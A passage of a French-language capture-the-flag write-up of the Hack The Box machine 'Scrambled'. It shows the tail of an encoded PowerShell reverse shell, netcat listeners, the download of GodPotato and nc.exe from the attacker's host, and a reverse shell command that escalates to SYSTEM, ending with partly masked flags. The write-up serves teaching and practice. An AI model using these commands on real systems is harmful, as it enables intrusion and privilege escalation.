GUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```


Ayant lancer `netcat` avant tout, j'obtiens alors un shell en tant que `sqlsvc`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ rlwrap nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.10.174.
Ncat: Connection from 10.129.10.174:56758.

PS C:\Windows\system32> whoami
scrm\sqlsvc
```


## Shell en tant que administrator
### SeImpersonatePrivilege

L'utilisateur `sqlsvc` possède le droit `SeImpersonatePrivilege`. Ce qui lui permet d'emprunter l’identité d’un client après l’authentification. Pour résumé grossierement, il peut se faire passer pour un autre utilisateur.
```
PS C:\users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


Pour exploiter cette attaque, j'utilise `GodPotato` et `netcat` pour obtenir un reverse shell en tant que `administrator`.
```
PS C:\> cd Temp
PS C:\Temp> ls
PS C:\Temp> wget http://10.10.14.224:1337/GodPotato-NET4.exe -o gp.exe
PS C:\Temp> wget http://10.10.14.224:1337/nc.exe -o nc.exe
PS C:\Temp> ./gp.exe

    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF


Arguments:

        -cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c whoami"

PS C:\Temp> ./gp.exe -cmd "C:\Temp\nc.exe -e cmd.exe 10.10.14.224 4444"
```


Je suis administrateur de la machine. Je peux alors récupérer les deux flags. Le flag user se trouvant dans le répertoire Desktop de l'utilisateur `miscsvc`.
```
╭─root at exegol-htb in /workspace/Scrambled
╰─○ rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.10.174.
Ncat: Connection from 10.129.10.174:49422.
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>whoami
whoami
nt authority\system

--<snip>--

C:\Users\administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Users\administrator\Desktop

29/05/2022  21:02    <DIR>          .
29/05/2022  21:02    <DIR>          ..
01/07/2025  12:36                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  16,004,931,584 bytes free

C:\Users\administrator\Desktop>type root.txt
type root.txt
14b39f9*************************

--<snip>--

C:\Users\miscsvc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Users\miscsvc\Desktop

03/11/2021  20:32    <DIR>          .
03/11/2021  20:32    <DIR>          ..
01/07/2025  12:36                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  16,004,915,200 bytes free

C:\Users\miscsvc\Desktop>type user.txt
type user.txt
a2a49937************************
```
